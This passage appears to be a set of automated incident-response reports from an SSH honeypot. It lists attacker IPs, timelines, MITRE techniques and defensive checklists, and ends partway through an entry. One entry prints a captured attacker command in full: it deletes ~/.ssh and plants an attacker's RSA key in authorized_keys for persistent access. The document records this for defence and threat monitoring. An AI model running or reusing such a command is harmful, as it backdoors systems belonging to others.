| Field | Detail |
|---|---|
| **Source IP** | `179.184.218[.]49` |
| **First Seen** | 2026-08-08 01:57 |
| **Last Seen** | 2026-08-08 01:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:57:17` | `cowrie.session.connect` |
| `2026-08-08 01:57:17` | `cowrie.client.version` |
| `2026-08-08 01:57:17` | `cowrie.client.kex` |
| `2026-08-08 01:57:19` | `cowrie.login.success` |
| `2026-08-08 01:57:20` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.218[.]49` to AbuseIPDB if not already reported
- [ ] Block `179.184.218[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c621f1f2a128

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:58 |
| **Last Seen** | 2026-08-08 01:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:58:22` | `cowrie.session.connect` |
| `2026-08-08 01:58:22` | `cowrie.client.version` |
| `2026-08-08 01:58:22` | `cowrie.client.kex` |
| `2026-08-08 01:58:22` | `cowrie.login.success` |
| `2026-08-08 01:58:23` | `cowrie.session.params` |
| `2026-08-08 01:58:23` | `cowrie.command.input` |
| `2026-08-08 01:58:23` | `cowrie.log.closed` |
| `2026-08-08 01:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23851684242a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:00 |
| **Last Seen** | 2026-08-08 02:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:00:05` | `cowrie.session.connect` |
| `2026-08-08 02:00:05` | `cowrie.client.version` |
| `2026-08-08 02:00:05` | `cowrie.client.kex` |
| `2026-08-08 02:00:06` | `cowrie.login.success` |
| `2026-08-08 02:00:06` | `cowrie.session.params` |
| `2026-08-08 02:00:06` | `cowrie.command.input` |
| `2026-08-08 02:00:06` | `cowrie.log.closed` |
| `2026-08-08 02:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f852f07df5c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:01 |
| **Last Seen** | 2026-08-08 02:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:01:48` | `cowrie.session.connect` |
| `2026-08-08 02:01:48` | `cowrie.client.version` |
| `2026-08-08 02:01:48` | `cowrie.client.kex` |
| `2026-08-08 02:01:48` | `cowrie.login.success` |
| `2026-08-08 02:01:49` | `cowrie.session.params` |
| `2026-08-08 02:01:49` | `cowrie.command.input` |
| `2026-08-08 02:01:49` | `cowrie.log.closed` |
| `2026-08-08 02:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd14a373c0a6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:03 |
| **Last Seen** | 2026-08-08 02:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:03:31` | `cowrie.session.connect` |
| `2026-08-08 02:03:31` | `cowrie.client.version` |
| `2026-08-08 02:03:31` | `cowrie.client.kex` |
| `2026-08-08 02:03:31` | `cowrie.login.success` |
| `2026-08-08 02:03:32` | `cowrie.session.params` |
| `2026-08-08 02:03:32` | `cowrie.command.input` |
| `2026-08-08 02:03:32` | `cowrie.log.closed` |
| `2026-08-08 02:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcadf9640625

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:05 |
| **Last Seen** | 2026-08-08 02:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:05:17` | `cowrie.session.connect` |
| `2026-08-08 02:05:17` | `cowrie.client.version` |
| `2026-08-08 02:05:17` | `cowrie.client.kex` |
| `2026-08-08 02:05:17` | `cowrie.login.success` |
| `2026-08-08 02:05:18` | `cowrie.session.params` |
| `2026-08-08 02:05:18` | `cowrie.command.input` |
| `2026-08-08 02:05:18` | `cowrie.log.closed` |
| `2026-08-08 02:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f215ced2a39

| Field | Detail |
|---|---|
| **Source IP** | `65.181.79[.]60` |
| **First Seen** | 2026-08-08 02:06 |
| **Last Seen** | 2026-08-08 02:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:06:49` | `cowrie.session.connect` |
| `2026-08-08 02:06:49` | `cowrie.client.version` |
| `2026-08-08 02:06:49` | `cowrie.client.kex` |
| `2026-08-08 02:06:52` | `cowrie.login.success` |
| `2026-08-08 02:06:53` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.181.79[.]60` to AbuseIPDB if not already reported
- [ ] Block `65.181.79[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f5dd880c79

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:07 |
| **Last Seen** | 2026-08-08 02:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:07:01` | `cowrie.session.connect` |
| `2026-08-08 02:07:01` | `cowrie.client.version` |
| `2026-08-08 02:07:01` | `cowrie.client.kex` |
| `2026-08-08 02:07:01` | `cowrie.login.success` |
| `2026-08-08 02:07:02` | `cowrie.session.params` |
| `2026-08-08 02:07:02` | `cowrie.command.input` |
| `2026-08-08 02:07:02` | `cowrie.log.closed` |
| `2026-08-08 02:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-396ffe71f6a7

| Field | Detail |
|---|---|
| **Source IP** | `41.178.230[.]115` |
| **First Seen** | 2026-08-08 02:07 |
| **Last Seen** | 2026-08-08 02:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:07:02` | `cowrie.session.connect` |
| `2026-08-08 02:07:03` | `cowrie.client.version` |
| `2026-08-08 02:07:03` | `cowrie.client.kex` |
| `2026-08-08 02:07:04` | `cowrie.login.success` |
| `2026-08-08 02:07:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.178.230[.]115` to AbuseIPDB if not already reported
- [ ] Block `41.178.230[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e0c7230f48

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:08 |
| **Last Seen** | 2026-08-08 02:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:08:40` | `cowrie.session.connect` |
| `2026-08-08 02:08:40` | `cowrie.client.version` |
| `2026-08-08 02:08:40` | `cowrie.client.kex` |
| `2026-08-08 02:08:40` | `cowrie.login.success` |
| `2026-08-08 02:08:41` | `cowrie.session.params` |
| `2026-08-08 02:08:41` | `cowrie.command.input` |
| `2026-08-08 02:08:41` | `cowrie.log.closed` |
| `2026-08-08 02:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0854cc005cb

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-08 02:09 |
| **Last Seen** | 2026-08-08 02:10 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:09:44` | `cowrie.session.connect` |
| `2026-08-08 02:09:47` | `cowrie.client.version` |
| `2026-08-08 02:09:47` | `cowrie.client.kex` |
| `2026-08-08 02:09:58` | `cowrie.login.success` |
| `2026-08-08 02:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077e2894e013

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-08-08 02:10 |
| **Last Seen** | 2026-08-08 02:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:10:03` | `cowrie.session.connect` |
| `2026-08-08 02:10:03` | `cowrie.client.version` |
| `2026-08-08 02:10:03` | `cowrie.client.kex` |
| `2026-08-08 02:10:04` | `cowrie.login.success` |
| `2026-08-08 02:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637638974d13

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:10 |
| **Last Seen** | 2026-08-08 02:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:10:19` | `cowrie.session.connect` |
| `2026-08-08 02:10:19` | `cowrie.client.version` |
| `2026-08-08 02:10:19` | `cowrie.client.kex` |
| `2026-08-08 02:10:19` | `cowrie.login.success` |
| `2026-08-08 02:10:20` | `cowrie.session.params` |
| `2026-08-08 02:10:20` | `cowrie.command.input` |
| `2026-08-08 02:10:20` | `cowrie.log.closed` |
| `2026-08-08 02:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97f67aabd7a6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:12 |
| **Last Seen** | 2026-08-08 02:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:12:03` | `cowrie.session.connect` |
| `2026-08-08 02:12:03` | `cowrie.client.version` |
| `2026-08-08 02:12:03` | `cowrie.client.kex` |
| `2026-08-08 02:12:03` | `cowrie.login.success` |
| `2026-08-08 02:12:04` | `cowrie.session.params` |
| `2026-08-08 02:12:04` | `cowrie.command.input` |
| `2026-08-08 02:12:04` | `cowrie.log.closed` |
| `2026-08-08 02:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-060aa18716dc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:13 |
| **Last Seen** | 2026-08-08 02:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:13:45` | `cowrie.session.connect` |
| `2026-08-08 02:13:45` | `cowrie.client.version` |
| `2026-08-08 02:13:46` | `cowrie.client.kex` |
| `2026-08-08 02:13:46` | `cowrie.login.success` |
| `2026-08-08 02:13:47` | `cowrie.session.params` |
| `2026-08-08 02:13:47` | `cowrie.command.input` |
| `2026-08-08 02:13:47` | `cowrie.log.closed` |
| `2026-08-08 02:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be66be9c55d1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:15 |
| **Last Seen** | 2026-08-08 02:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:15:28` | `cowrie.session.connect` |
| `2026-08-08 02:15:28` | `cowrie.client.version` |
| `2026-08-08 02:15:28` | `cowrie.client.kex` |
| `2026-08-08 02:15:29` | `cowrie.login.success` |
| `2026-08-08 02:15:29` | `cowrie.session.params` |
| `2026-08-08 02:15:29` | `cowrie.command.input` |
| `2026-08-08 02:15:29` | `cowrie.log.closed` |
| `2026-08-08 02:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a09c211d91

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:17 |
| **Last Seen** | 2026-08-08 02:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:17:15` | `cowrie.session.connect` |
| `2026-08-08 02:17:15` | `cowrie.client.version` |
| `2026-08-08 02:17:15` | `cowrie.client.kex` |
| `2026-08-08 02:17:15` | `cowrie.login.success` |
| `2026-08-08 02:17:16` | `cowrie.session.params` |
| `2026-08-08 02:17:16` | `cowrie.command.input` |
| `2026-08-08 02:17:16` | `cowrie.log.closed` |
| `2026-08-08 02:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e1ffd61367

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:19 |
| **Last Seen** | 2026-08-08 02:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:19:04` | `cowrie.session.connect` |
| `2026-08-08 02:19:04` | `cowrie.client.version` |
| `2026-08-08 02:19:05` | `cowrie.client.kex` |
| `2026-08-08 02:19:05` | `cowrie.login.success` |
| `2026-08-08 02:19:06` | `cowrie.session.params` |
| `2026-08-08 02:19:06` | `cowrie.command.input` |
| `2026-08-08 02:19:06` | `cowrie.log.closed` |
| `2026-08-08 02:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c52bc317738

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-08-08 02:20 |
| **Last Seen** | 2026-08-08 02:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:20:06` | `cowrie.session.connect` |
| `2026-08-08 02:20:06` | `cowrie.client.version` |
| `2026-08-08 02:20:06` | `cowrie.client.kex` |
| `2026-08-08 02:20:08` | `cowrie.login.success` |
| `2026-08-08 02:20:09` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e48a4c4a9b75

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:20 |
| **Last Seen** | 2026-08-08 02:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:20:48` | `cowrie.session.connect` |
| `2026-08-08 02:20:48` | `cowrie.client.version` |
| `2026-08-08 02:20:48` | `cowrie.client.kex` |
| `2026-08-08 02:20:48` | `cowrie.login.success` |
| `2026-08-08 02:20:49` | `cowrie.session.params` |
| `2026-08-08 02:20:49` | `cowrie.command.input` |
| `2026-08-08 02:20:49` | `cowrie.log.closed` |
| `2026-08-08 02:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e82f7e2ddc64

| Field | Detail |
|---|---|
| **Source IP** | `177.128.224[.]122` |
| **First Seen** | 2026-08-08 02:22 |
| **Last Seen** | 2026-08-08 02:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:22:25` | `cowrie.session.connect` |
| `2026-08-08 02:22:25` | `cowrie.client.version` |
| `2026-08-08 02:22:25` | `cowrie.client.kex` |
| `2026-08-08 02:22:26` | `cowrie.login.success` |
| `2026-08-08 02:22:27` | `cowrie.session.params` |
| `2026-08-08 02:22:27` | `cowrie.command.input` |
| `2026-08-08 02:22:27` | `cowrie.command.failed` |
| `2026-08-08 02:22:27` | `cowrie.log.closed` |
| `2026-08-08 02:22:28` | `cowrie.session.params` |
| `2026-08-08 02:22:28` | `cowrie.command.input` |
| `2026-08-08 02:22:28` | `cowrie.session.file_download` |
| `2026-08-08 02:22:28` | `cowrie.log.closed` |
| `2026-08-08 02:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.128.224[.]122` to AbuseIPDB if not already reported
- [ ] Block `177.128.224[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df0adbd98605

| Field | Detail |
|---|---|
| **Source IP** | `177.128.224[.]122` |
| **First Seen** | 2026-08-08 02:22 |
| **Last Seen** | 2026-08-08 02:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:22:28` | `cowrie.session.connect` |
| `2026-08-08 02:22:28` | `cowrie.client.version` |
| `2026-08-08 02:22:28` | `cowrie.client.kex` |
| `2026-08-08 02:22:29` | `cowrie.login.success` |
| `2026-08-08 02:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.128.224[.]122` to AbuseIPDB if not already reported
- [ ] Block `177.128.224[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d35234053ad

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 02:22 |
| **Last Seen** | 2026-08-08 02:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:22:29` | `cowrie.session.connect` |
| `2026-08-08 02:22:29` | `cowrie.client.version` |
| `2026-08-08 02:22:29` | `cowrie.client.kex` |
| `2026-08-08 02:22:29` | `cowrie.login.success` |
| `2026-08-08 02:22:30` | `cowrie.session.params` |
| `2026-08-08 02:22:30` | `cowrie.command.input` |
| `2026-08-08 02:22:30` | `cowrie.log.closed` |
| `2026-08-08 02:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7c746d813f

| Field | Detail |
|---|---|
| **Source IP** | `177.128.224[.]122` |
| **First Seen** | 2026-08-08 02:22 |
| **Last Seen** | 2026-08-08 02:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:22:29` | `cowrie.session.connect` |
| `2026-08-08 02:22:29` | `cowrie.client.version` |
| `2026-08-08 02:22:30` | `cowrie.client.kex` |
| `2026-08-08 02:22:30` | `cowrie.login.success` |
| `2026-08-08 02:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.128.224[.]122` to AbuseIPDB if not already reported
- [ ] Block `177.128.224[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb61f6fd5877

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-08-08 02:22 |
| **Last Seen** | 2026-08-08 02:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 02:22:56` | `cowrie.session.connect` |
| `2026-08-08 02:22:57` | `cowrie.client.version` |
| `2026-08-08 02:22:57` | `cowrie.client.kex` |
| `2026-08-08 02:22:59` | `cowrie.login.success` |
| `2026-08-08 02:22:59` | `cowrie.direct-tcpip.request` |
| `2026-08-08 02:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9f541b448f

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-08-08 02:23 |
| **Last Seen** | 2026-08-08 02:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
